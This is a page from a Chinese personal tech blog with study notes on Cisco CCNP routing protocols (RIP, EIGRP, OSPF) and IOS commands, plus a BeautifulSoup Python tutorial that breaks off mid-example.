
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>dmonster&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="none">
<meta property="og:type" content="website">
<meta property="og:title" content="dmonster&#39;s blog">
<meta property="og:url" content="http://dmonster.top/page/2/index.html">
<meta property="og:site_name" content="dmonster&#39;s blog">
<meta property="og:description" content="none">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="dmonster&#39;s blog">
<meta name="twitter:description" content="none">
  
    <link rel="alternative" href="/atom.xml" title="dmonster&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" href="/css/style.css">
  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
</head>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">dmonster&#39;s blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">Hello my world!</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
          <a class="main-nav-link" href="/sitemap.xml">sitemap</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="dmonster.top">
        </form>
      </div>
    </div>
  </div>
</header>
    <div class="outer">
      <section id="main">
  
    <article id="post-CCNP--路由IGP" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/07/16/CCNP--路由IGP/" class="article-date">
  <time datetime="2017-07-16T08:05:35.000Z" itemprop="datePublished">2017-07-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/07/16/CCNP--路由IGP/">CCNP路由IGP</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
      <!-- Table of Contents -->
      
        <h1 id="静态配置"><a href="#静态配置" class="headerlink" title="静态配置"></a>静态配置</h1><p>网络管理员手动添加  小型规模网络  维护成本高  不能灵活变通</p>
<h3 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a>路由表</h3><p>连接方式     连接网段/网络位位数 [管理距离/metric值] via 下一跳地址, 已连接时间, 本地出接口</p>
<ul>
<li>管理距离：路由的可信度 值越小，越可信</li>
<li>metric值：开销/成本 以跳数计算</li>
</ul>
<h2 id="配置语句"><a href="#配置语句" class="headerlink" title="配置语句"></a>配置语句</h2><pre><code>ip route 目的地网段 目的地的子网掩码 下一跳地址
ip route 目的地网段 目的地的子网掩码 本地出接口
</code></pre><p>两种方式同时配置，接口方式优先生效</p>
<h2 id="源ip与目的ip"><a href="#源ip与目的ip" class="headerlink" title="源ip与目的ip"></a>源ip与目的ip</h2><p>默认情况下路由器会选择到达该目的地流量发出的接口ip为数据包的源ip<br>回复时源ip为发送数据的目的ip 目的ip为发送数据的源ip</p>
<h1 id="动态配置"><a href="#动态配置" class="headerlink" title="动态配置"></a>动态配置</h1><h2 id="路由环路解决方法"><a href="#路由环路解决方法" class="headerlink" title="路由环路解决方法"></a>路由环路解决方法</h2><p>（所有路由器上默认开启）</p>
<ol>
<li>水平分割 路由条目从本地路由器端口发出去，本地路由器的这个端口不会再接收该路由条目</li>
<li>路由毒化 将网络跳数设置成16  （跳数限制：数据在网络中最多经过16跳）</li>
<li>毒性反转 （不遵守水平分割原则）将毒性发给本地路由器发送的路由条目</li>
<li>hold-down倒计时 240s</li>
</ol>
<h2 id="汇总机制"><a href="#汇总机制" class="headerlink" title="汇总机制"></a>汇总机制</h2><p>简化路由表<br>172.16.1.0/24 - 172.16.100.0/24 -&gt;172.16.0.0/16<br>所有的路由器会自动将子网汇总成主类网络向外发</p>
<h2 id="被动接口-passive-interfacce-："><a href="#被动接口-passive-interfacce-：" class="headerlink" title="被动接口(passive-interfacce)："></a>被动接口(passive-interfacce)：</h2><p>只接受更新，不发送</p>
<pre><code>router rip
pas 接口
</code></pre><h2 id="单播更新"><a href="#单播更新" class="headerlink" title="单播更新"></a>单播更新</h2><p>指定更新的接受者</p>
<pre><code>router rip
ne 接口地址
</code></pre><h2 id="路由选择原则："><a href="#路由选择原则：" class="headerlink" title="路由选择原则："></a>路由选择原则：</h2><ol>
<li>最长匹配原则：网络位最长</li>
<li>若到达同一目的地通过不同的协议收到路径，优选管理距离小的</li>
<li>若到达同意目的地通过相同的协议收到路径，优选metric值小的</li>
</ol>
<h2 id="5k值（metric值）"><a href="#5k值（metric值）" class="headerlink" title="5k值（metric值）"></a>5k值（metric值）</h2><ol>
<li>带宽 ：物理接口的最大传输速率 =10^7/所经路径中最小带宽*256 kbit/s</li>
<li>负载 ：所能承载最大数据量</li>
<li>延迟 ：延迟 =所经路径产生的延迟总和/10*256 us</li>
<li>有效性 ：有效性（保质期，TTL值：最大能够经过多少台路由器，毎经过一台路由器ttl值-1）</li>
<li>mtu值 ：mtu值：每一个数据包中最大能包含多少字节</li>
</ol>
<h2 id="router-id"><a href="#router-id" class="headerlink" title="router-id"></a>router-id</h2><p>在本网络中对本台设备的标识</p>
<ol>
<li>若本地无环回接口则比较物理地址的大小，大的作为本地路由器的router-id</li>
<li>若本地有环回接口有限选用环回接口地址最为本台路由器的router-id<br>若有多个环回接口选取地址大的</li>
</ol>
<h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><ul>
<li>自制系统（as）：处于同一管理机制下的路由器</li>
<li>lgp： 内部网管路由选择协议（管理距离） rip（120） eigrp（内部路由90 外部路由170） ospf（110）</li>
<li>egp： 边界网管路由选择协议（管理距离） bgp（内部200 外部20）</li>
</ul>
<h3 id="rip协议"><a href="#rip协议" class="headerlink" title="rip协议"></a>rip协议</h3><ul>
<li>最多16台路由器，只适用于小型</li>
<li>网络中</li>
<li>距离矢量路由选择协议</li>
<li>版本v1（ipv4，不支持vlsm子网掩码，不支持认证，不支持手动汇总），v2（ipv4，支持vlsm子网掩码，支持认证，支持手动汇总），ng（ipv6）</li>
<li>毎30s发一次路由更新，v1以广播形式广播地址发送   v2加进一组，组播地址224.0.0.9（组播更新）</li>
<li>rip路由更新线路不通时，先敬如180s等待，若之后的240s后还没恢复，则删除路由条目</li>
<li>rip认证<ul>
<li>明文：向外发送密钥时，只会发送编号最小的密码</li>
<li>密文：将所有编号的密码都向外发送</li>
</ul>
</li>
</ul>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><ul>
<li>在全局模式下输入 router rip 进入协议进程配置模式</li>
<li>输入 net 本地直连网络（有类网络） 1.0.0.0  宣告本地直连的网段</li>
<li>deb ip rip 显示rip动态信息</li>
<li>router rip ？ 配置rip版本</li>
<li><p>在接口下</p>
<pre><code>ip rip send version 1/2 发送什么类型的更新
ip rip receieve version 1/2 接收什么类型的更新
</code></pre></li>
</ul>
<h3 id="eigrp协议"><a href="#eigrp协议" class="headerlink" title="eigrp协议"></a>eigrp协议</h3><ol>
<li>工作类型：高级距离矢量路由选择协议</li>
<li>思科私有协议</li>
<li>能保证路由选择100%无环（DUAL算法）</li>
<li>支持vlsm</li>
<li>支持组播和单播更新</li>
<li>支持自动汇总和手动汇总</li>
<li>快速收敛（路由表的更新）</li>
<li>支持认证</li>
<li>eigrp中一个路由器可以属于多个as，但每个接口只能属于一个as</li>
<li>eigrp消息类型：<ul>
<li>hello信息</li>
<li>更新信息</li>
<li>ack确认信息</li>
<li>查询信息<br>-查询恢复</li>
</ul>
</li>
<li>汇总<ul>
<li>自动汇总</li>
<li>手动汇总</li>
</ul>
</li>
</ol>
<ul>
<li>邻居表 :毎5s以组播地址（224.0.0.10）向外发送hello包询问当前网络是否有同伴存在建立邻居关系<ul>
<li>前提条件：1.能互相收到hello包（直连），2.处于同一AS之内  3. 5k值要匹配（eigrp 5k值默认10100）</li>
</ul>
</li>
<li>拓扑表 ：包含邻居发给我的所有更新条目<ul>
<li>ad 通告距离 ：下一跳路由器到达目的地的距离</li>
<li>fd 可行距离 ：本地路由器到达目的地的距离</li>
<li>fs 可行条件 ：能被路由器选为可行路径需要符合的条件 ad &lt; 最小fd</li>
<li>sus 后继者 ：最优路径 （满足可行条件）</li>
<li>fsus 可行后继者 ：次优路径  （也必须满足可行条件）</li>
</ul>
</li>
<li>路由表</li>
</ul>
<h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><pre><code>router ei ?(as号)
net 1.0.0.0
</code></pre><ul>
<li><p>精确宣告</p>
<ul>
<li><p>通配符（反掩码）： 0精确匹配，1不匹配 </p>
<p>  net 172.16.1.0 0.0.0.255</p>
</li>
</ul>
</li>
<li><p>手动汇总</p>
<pre><code>no auto  //关闭自动汇总
</code></pre></li>
<li><p>负载均衡    </p>
<ul>
<li>等价负载均衡：metric值一样</li>
<li><p>不等价负载均衡 ：将可行后继放进路由表中</p>
<pre><code>router ei 1
va X    //修改倍数因子
</code></pre></li>
</ul>
</li>
<li><p>末结区域</p>
<pre><code>不接受查询信息，
不连接其他任何网段，末结区域的路由器只关心本地是否能够向外通信

router ei 1
eigrp stub
</code></pre></li>
</ul>
<h3 id="ospf协议"><a href="#ospf协议" class="headerlink" title="ospf协议"></a>ospf协议</h3><p>开放最短路径优先</p>
<ul>
<li>链路状态路由选择协议</li>
<li>lsa数据包（11种）</li>
<li>邻接关系：逻辑上连接（在同一网络中）</li>
<li>骨干区域，非骨干区域 ： 非骨干区域之间的通信必须经过骨干区域（非骨干区域必须跟骨干狳直接相连）</li>
<li><p>DR指定路由器/BDR备份指定路由器/DRother其他路由器：（只有在刚播网络中才会竞选）</p>
<ul>
<li><p>优先级：越大越好 默认1  -255   设为0不称为DR/BDR</p>
<pre><code>int e0/1
ip os pr X  //修改优先级值
</code></pre></li>
<li>接口ip：大—DR</li>
<li>所有的路由器与DR与BDR之间建立邻接关系，DRother之间不建立任何邻接关系，他们一直处于two-way状态，DRother将所有更新条目发送给DR和BDR，DR和BDR汇总完成后再下发给DRother</li>
</ul>
</li>
<li><p>虚链路 中间只能横跨一个区域 一条骨干上虚链路只能有一个</p>
<pre><code>router os 1
ar X（需要穿过的区域） vir X（对方router-id）
</code></pre></li>
<li>邻居表</li>
<li>lsdb链路状态数据库 dbd数据库描述 sh ip os databse </li>
<li><p>cost开销值（受带宽影响）在接口下ip os cost X在接受方向上改变</p>
<pre><code>带宽          cost=metric 
10            100
100            19
1000        4
10000        2
</code></pre></li>
<li><p>消息类型</p>
<ul>
<li>hello</li>
<li>bdb</li>
<li>lsr链路状态查询</li>
<li>lsu链路状态更新</li>
<li>lsack链路状态确认</li>
</ul>
</li>
<li><p>lsa链路状态通告</p>
<ul>
<li>1类：router lsa （路由器lsa）区域内所有路由器都会自行产生一条，其中包含本地所有参与ospf的接口，ip，开销链路类型，等物理信息。只会在本区域内传递，不能穿过ABR</li>
<li>2类：network lsa （网络lsa）由DR产生，在本区域内传递，通告本段链路所能到达的所有路径。  O</li>
<li>3类：network summary lsa（网络汇总lsa）由ABR产生，向其他区域通告本区域的路径信息。通告范围：AS，即所有启用ospl的其他区域（本区域和特殊区域除外）   O IA</li>
<li>4类：ASBR汇总lsa 由ABR产生，向其他区域通告本区域中的ASBR是谁</li>
<li>5类：外部路径lsa 由ASBR产生，向ospf自制系统中通告外部路径 产生的路由类型O E2：在ospf自制系统中的传递开销值不会叠加 默认20 ； O E1: 在ospf自制系统中传递叠加开销值 ，若同时有OE1和OE2的路由存在优选OE1</li>
<li>7类：NSSA区域中的外部路径lsa ON2不叠加开销值；ON1叠加开销值</li>
</ul>
</li>
<li><p>特殊区域   </p>
<ul>
<li>stub 末结区域 ：身后不连接其他任何自制系统，但可以正常接收        ospf中其他区域的路由条目。123传递，457不传递</li>
<li><p>totally stup 完全末结区域：身后不连接其他任何自制系统，也不接               收ospf中其他区域路由条目。</p>
<pre><code>area X stub //末结
area X stub no-summary //完全末结
</code></pre><ul>
<li>由ABR向末结和完全末结区域内下发一条缺省路由以作通信（下一跳为ABR）</li>
</ul>
</li>
<li>nssa    末梢区域：可以传递外部路由（7类lsa））（缺省路由）</li>
<li><p>totally nssa 完全末梢区域：可以传递外部路由（7类lsa））（缺省路由）</p>
<pre><code>area X nssa //末梢
area X nssa no-summary //完全末梢
</code></pre></li>
</ul>
</li>
</ul>
<ul>
<li><p>ospf中接口网络类型    sh ip os int X（接口编号）</p>
<ol>
<li>广播：所有的以太网默认都是广播类型的</li>
<li>点到点：只有一个邻居的存在（串口默认）   接口下 ip os net point-to-point</li>
<li>NBMA ：非广播型多链路访问 （帧中继）</li>
<li>点到多点</li>
</ol>
</li>
<li><p>ospf默认所有环回口地址都为主机地址/32  —-改成点到点变正常</p>
</li>
</ul>
<h4 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h4><ul>
<li><p>接口下</p>
<pre><code>ospf X area 区域号
</code></pre></li>
<li><p>ospf进程下</p>
<pre><code>router ospf X（进程号）
net 12.12.12.0 0.0.0.255 area X（区域号0为骨干区域，其他都为非骨干区域）宣告必须携带反掩码
</code></pre></li>
<li><p>重置ospf</p>
<pre><code>clear os pr
</code></pre></li>
<li><p>汇总（针对区域，外部汇总）</p>
<ol>
<li><p>ospf自制系统内的区域汇总（ABR上）</p>
<pre><code>router ospf ？（进程id）
area ？ range 汇总后的网段 汇总后网段的子网掩码
</code></pre></li>
<li><p>ospf外部路由的汇总（ASBR上）</p>
<pre><code>summary-address 汇总后的网段 汇总后网段的子网掩码
router os 1
re co su
</code></pre></li>
</ol>
</li>
<li><p>认证</p>
<ol>
<li><p>区域认证</p>
<pre><code>router os X
明文 area 1 au        
密文 area 1 au message 
</code></pre><p>到该区域的接口下配置密码</p>
</li>
<li><p>接口认证</p>
<pre><code>明文 ip ospf au-key key X(密码)
密文 ip ospf au message
    ip ospf messsafe key X(密码) md5
</code></pre></li>
</ol>
</li>
</ul>
<h3 id="重分发"><a href="#重分发" class="headerlink" title="重分发"></a>重分发</h3><ul>
<li><p>其他路由选择协议进rip</p>
<pre><code>router rip
redistribute 协议 metric X（metric值，默认为0 ）
</code></pre></li>
<li><p>其他路由选择协议进erigrp</p>
<pre><code>router ei ?
re 协议 metric 10000带宽 100延迟 255可靠值 1负载 150mtu
</code></pre></li>
<li><p>其他路由选择协议进ospf</p>
<pre><code>router os 1
red 协议 sub （metric-type X）（metric ？）
</code></pre></li>
<li><p>connected：直连</p>
</li>
<li>双向重分发：两个协议都能收到互相的路由信息</li>
</ul>
<h1 id="用路由器模拟pc机"><a href="#用路由器模拟pc机" class="headerlink" title="用路由器模拟pc机"></a>用路由器模拟pc机</h1><pre><code>接口下no ip route
</code></pre><h1 id="配置网关"><a href="#配置网关" class="headerlink" title="配置网关"></a>配置网关</h1><pre><code>ip de-ga 网关地址    
</code></pre>
      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://dmonster.top/2017/07/16/CCNP--路由IGP/" data-id="cjexzmnmh000re4ugzkkpk0q7" class="article-share-link" data-share="baidu" data-title="CCNP路由IGP">分享到</a>
      

      
        <a href="http://dmonster.top/2017/07/16/CCNP--路由IGP/#ds-thread" class="article-comment-link">评论</a>
      

      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CCNP/">CCNP</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-CCNP--命令行" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/07/15/CCNP--命令行/" class="article-date">
  <time datetime="2017-07-15T14:16:54.000Z" itemprop="datePublished">2017-07-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/07/15/CCNP--命令行/">CISCO CCNP PT命令行</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
      <!-- Table of Contents -->
      
        <h1 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h1><ul>
<li>enable            //从用户模式进入到特权模式</li>
<li>configure terminal  //从特权模式进入到全局配置模式</li>
<li>hostname R1      //修改主机名为R1</li>
<li>no ip domain-lookup  //关闭CISCO IOS 域名查找功能，防止当用户输入错误命令行时，CISCO IOS 会将该命令行当做主机域名进行解析。</li>
<li>line console 0 (换行) no exec-timeout     //关闭console 接口的空闲超时功能，这样当用户暂时离开设备并且在没有配置的情况下，系统也不会将当前用户踢出到用户模式以外。</li>
<li>logging sync        //开启日志同步功能，在该命令输入后，系统日志提示信息不再会打断用户当前输入的指令，而是将用户当前指令整个复制并另起一行现实。</li>
<li>exit               //从当前模式退出到上一模式</li>
<li>clock time-zone GMT +8  //设置系统当前时区为 GMT （格林威治时区）并且设置为+8的时差</li>
<li>clock set hh:mm:ss day month year //设置当前系统的时钟</li>
<li>configure terminal  //从特权模式重新进入配置模式</li>
<li>enable password cisco  //设置明文形式的ENABLE 特权密码</li>
<li>enable secret CISCO   //设置密文形式的ENABLE 特权密码</li>
<li>line console 0 (换行) password CCNA      //设置CONSOLE 接口密码</li>
<li>line console 0 (换行) login              //使得CONSOLE 密码生效</li>
<li>anner motd ! welcome to JUSTECH!  //设置登录提示信息内容</li>
<li>interface serial 1/1  //进入接口配置模式</li>
<li>ip address 1.1.1.1 255.255.255.0 // 配置当前接口IP 地址</li>
<li>no shutdown         //激活该端口</li>
<li>write            //保存当前配置</li>
<li>show ip route   //查看本地路由器的路由表</li>
</ul>
<h1 id="show命令"><a href="#show命令" class="headerlink" title="show命令"></a>show命令</h1><p>##基础部分</p>
<ul>
<li>sh version  //查看路由版本，硬件状态</li>
<li>sh ip int brief  //查看接口简要信息</li>
<li>sh run  //查看当前运行配置</li>
<li>sh start  //查看启动配置文件</li>
<li>sh int fa0/0  //查看接口物理信息</li>
<li>sh ip int fa0/0  //查看接口协议信息</li>
</ul>
<h2 id="路由协议部分"><a href="#路由协议部分" class="headerlink" title="路由协议部分"></a>路由协议部分</h2><ul>
<li>sh ip protocols  //查看当前路由器运行的路由协议信息</li>
<li>sh ip route  //查看路由器路由表</li>
<li>sh ip eigrp/ospf neighbor  //查看eigrp/ospf邻接表</li>
<li>sh ip eigrp topology  //查看eigrp拓扑表</li>
<li>sh ospf database  //查看ospf的拓扑数据库</li>
</ul>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://dmonster.top/2017/07/15/CCNP--命令行/" data-id="cjexzmnly000fe4ug61gn44fi" class="article-share-link" data-share="baidu" data-title="CISCO CCNP PT命令行">分享到</a>
      

      
        <a href="http://dmonster.top/2017/07/15/CCNP--命令行/#ds-thread" class="article-comment-link">评论</a>
      

      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CCNP/">CCNP</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-BeautifulSoup库" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/04/23/BeautifulSoup库/" class="article-date">
  <time datetime="2017-04-23T02:33:44.000Z" itemprop="datePublished">2017-04-23</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/04/23/BeautifulSoup库/">BeautifulSoup库</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
      <!-- Table of Contents -->
      
        <p>若有如下html：</p>
<pre><code>html = &quot;&quot;&quot;
&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;&lt;/p&gt;
&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were
&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,
&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and
&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;
and they lived at the bottom of a well.&lt;/p&gt;
&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;
&quot;&quot;&quot;
</code></pre><h1 id="四大对象种类"><a href="#四大对象种类" class="headerlink" title="四大对象种类"></a>四大对象种类</h1><p>Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种</p>
<pre><code>soup = BeautifulSoup(open(&apos;index.html&apos;))
print soup.prettify() //格式化输出
</code></pre><h2 id="Tag"><a href="#Tag" class="headerlink" title="Tag"></a>Tag</h2><p>注释为输出结果</p>
<ul>
<li><p>.descendants<br>descendants 属性可以对所有tag的子孙节点进行递归循环</p>
<pre><code>for child in soup.descendants:
    print child
//返回所有子孙节点
</code></pre></li>
<li><p>.content</p>
<pre><code>print soup.head.content
[&lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;]
</code></pre><p>  返回的是一个list，用列表索引来获取它的摸一个元素：</p>
<pre><code>&gt;&gt;&gt;print soup.head.contents[0]
&lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;
</code></pre></li>
<li><p>.children</p>
<pre><code>print soup.body.children
&lt;listiterator object at 0x7f71457f5710&gt;
</code></pre><p>  返回的是一个list生成器对象，循环遍历：</p>
<pre><code>&gt;&gt;&gt;print soup.body.children:
    print child

&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;&lt;/p&gt;

&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were
&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,
&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and
&lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;
and they lived at the bottom of a well.&lt;/p&gt;

&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;
</code></pre></li>
<li><p>.patents</p>
<pre><code>content = soup.head.title.string
for parent in  content.parents:
    print parent.name

title
head
html
[document]
</code></pre></li>
<li><p>.next_sibling<br>  后一个兄弟节点</p>
</li>
<li><p>.previous_sibling</p>
<p>  前一个兄弟节点</p>
</li>
<li><p>print soup.title</p>
<pre><code>&lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;
</code></pre></li>
<li><p>print soup.head</p>
<pre><code>&lt;head&gt;&lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;&lt;/head&gt;
</code></pre></li>
<li><p>print soup.a</p>
<pre><code>&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;
</code></pre></li>
<li><p>print soup.p</p>
<pre><code>&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;&lt;/p&gt;
</code></pre><ul>
<li><p>print soup.p.attrs    // 得到字典</p>
<pre><code>{&apos;class&apos;: [&apos;title&apos;], &apos;name&apos;: &apos;dromouse&apos;}
</code></pre></li>
<li><p>print soup.p[‘class’] 或 print soup.p.get(‘class’)</p>
<pre><code>[&apos;title&apos;]
</code></pre><h2 id="NavigableString"><a href="#NavigableString" class="headerlink" title="NavigableString"></a>NavigableString</h2></li>
</ul>
</li>
<li><p>.string</p>
<pre><code>print soup.p.string   // 得到内容但只有第一条
The Dormouse&apos;s story
</code></pre></li>
<li><p>.strings</p>
<pre><code>&gt;&gt;&gt;for string in soup.strings:
       print(repr(string))

u&quot;The Dormouse&apos;s story&quot;
u&apos;\n\n&apos;
u&quot;The Dormouse&apos;s story&quot;
u&apos;\n\n&apos;
u&apos;Once upon a time there were three little sisters; and their names were\n&apos;
u&apos;Elsie&apos;
....
</code></pre></li>
<li><p>.stripped_strings</p>
<pre><code>&gt;&gt;&gt;for string in soup.stripped_strings:
        print(repr(string))

// 作用和 .strings一样但是不输出空白行和空格
</code></pre><p>BeautifulSoup 对象表示的是一个文档的全部内容.大部分时候,可以把它当作 Tag 对象，是一个特殊的 Tag，我们可以分别获取它的类型，名称，以及属性来感受一下</p>
<blockquote>
<blockquote>
<blockquote>
<p>print type(soup.name)<br>   <type 'unicode'=""><br>print soup.name<br>   [document]<br>print soup.attrs<br>   {} 空字典</type></p>
</blockquote>
</blockquote>
</blockquote>
</li>
</ul>
<h2 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h2><p>Comment 对象是一个特殊类型的 NavigableString 对象，其实输出的内容仍然不包括注释符号，但是如果不好好处理它，可能会对我们的文本处理造成意想不到的麻烦。</p>
<h1 id="搜索文档树"><a href="#搜索文档树" class="headerlink" title="搜索文档树"></a>搜索文档树</h1><ul>
<li><p>find_all( name , attrs , recursive , text , keyword )</p>
<p>  find_all() 方法搜索当前tag的所有tag子节点,并判断是否符合过滤器的条件</p>
<ul>
<li><p>name参数</p>
<p>  name 参数可以查找所有名字为 name 的tag,字符串对象会被自动忽略掉</p>
<ol>
<li><p>字符串</p>
<pre><code>&gt;&gt;&gt;soup.find_all(&apos;b&apos;)
 [&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;]
</code></pre></li>
<li><p>正则表达式</p>
<pre><code>for tag in soup.find_all(re.compile(&quot;^b&quot;)):
    print(tag.name)

body
b
</code></pre></li>
<li><p>传列表</p>
<p> 返回列表</p>
</li>
<li><p>传True</p>
<p> True 可以匹配任何值,查找到所有的tag</p>
</li>
<li><p>传方法</p>
<p> 如果没有合适过滤器,那么还可以定义一个方法,方法只接受一个元素参数 ,如果这个方法返回 True 表示当前元素匹配并且被找到,如果不是则反回 False</p>
</li>
</ol>
</li>
<li><p>keyword参数</p>
<pre><code>&gt;&gt;&gt;soup.find_all(id=&apos;link2&apos;)
 [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]
</code></pre><p>  在这里我们想用 class 过滤，不过 class 是 python 的关键词，这怎么办？加个下划线就可以</p>
<pre><code>&gt;&gt;&gt;soup.find_all(&quot;a&quot;, class_=&quot;sister&quot;)
 [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,
 &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,
 &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]
</code></pre></li>
<li><p>text参数</p>
<p>  通过 text 参数可以搜搜文档中的字符串内容.与 name 参数的可选值一样, text 参数接受 字符串 , 正则表达式 , 列表, True</p>
<pre><code>&gt;&gt;&gt;soup.find_all(text=&quot;Elsie&quot;)
 [u&apos;Elsie&apos;]
</code></pre></li>
<li><p>limit参数</p>
<p>  find_all() 方法返回全部的搜索结构,如果文档树很大那么搜索会很慢.如果我们不需要全部结果,可以使用 limit 参数限制返回结果的数量.效果与SQL中的limit关键字类似,当搜索到的结果数量达到 limit 的限制时,就停止搜索返回结果.</p>
<pre><code>&gt;&gt;&gt;soup.find_all(&quot;a&quot;, limit=2)
[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,
&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]
</code></pre></li>
<li><p>recursive参数</p>
<p>  调用tag的 find_all() 方法时,Beautiful Soup会检索当前tag的所有子孙节点,如果只想搜索tag的直接子节点,可以使用参数 recursive=False .</p>
</li>
</ul>
</li>
</ul>
<h1 id="css选择器"><a href="#css选择器" class="headerlink" title="css选择器"></a>css选择器</h1><p>我们在写 CSS 时，标签名不加任何修饰，类名前加点，id名前加 #，在这里我们也可以利用类似的方法来筛选元素，用到的方法是 soup.select()，返回类型是 list</p>
<ul>
<li><p>通过标签名查找</p>
<pre><code>print soup.select(&apos;title&apos;)
print soup.select(&apos;a&apos;)
</code></pre></li>
<li><p>通过类名查找</p>
<pre><code>print soup.select(&apos;.sister&apos;)
print soup.select(&apos;#link1&apos;)
</code></pre></li>
<li><p>组合查找</p>
<pre><code>print soup.select(&apos;p #link1&apos;)
